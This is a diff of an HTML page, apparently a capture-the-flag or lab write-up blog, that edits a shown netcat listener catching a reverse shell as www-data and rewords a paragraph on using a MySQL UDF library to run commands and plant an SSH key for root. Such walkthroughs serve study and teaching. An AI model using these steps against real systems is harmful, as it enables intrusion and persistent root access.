@@ -198,10 +198,8 @@
 <span class='line-number'>44</span>
 <span class='line-number'>45</span>
 <span class='line-number'>46</span>
-<span class='line-number'>47</span>
 </pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc -vlnp 7777
-</span><span class='line'>nnetfd reuseport failed : Protocol not available
-</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ... : Protocol not available
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
 </span><span class='line'>connect to <span class="o">[</span>10.8.7.1<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.8.7.101<span class="o">]</span> 39148
 </span><span class='line'><span class="nv">$ </span>id
 </span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
@@ -535,7 +533,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Without going into detail, I made a script that uploaded <code>lib_mysql_udf</code> to the remote server. After registering the right command, this allowed me to run commands. In one go, builds the command to upload <code>lib_mysql_udf</code> and it adds my public key to the ssh keys of the root user:</p>
+<p>Without going into detail, I made a script that uploaded <code>lib_mysql_udf</code> to the remote server. After registering the right command, this allowed me to run commands. In one go, the script builds the SQL command to install <code>lib_mysql_udf</code> and adds my public key to the authorized SSH keys of the root user:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
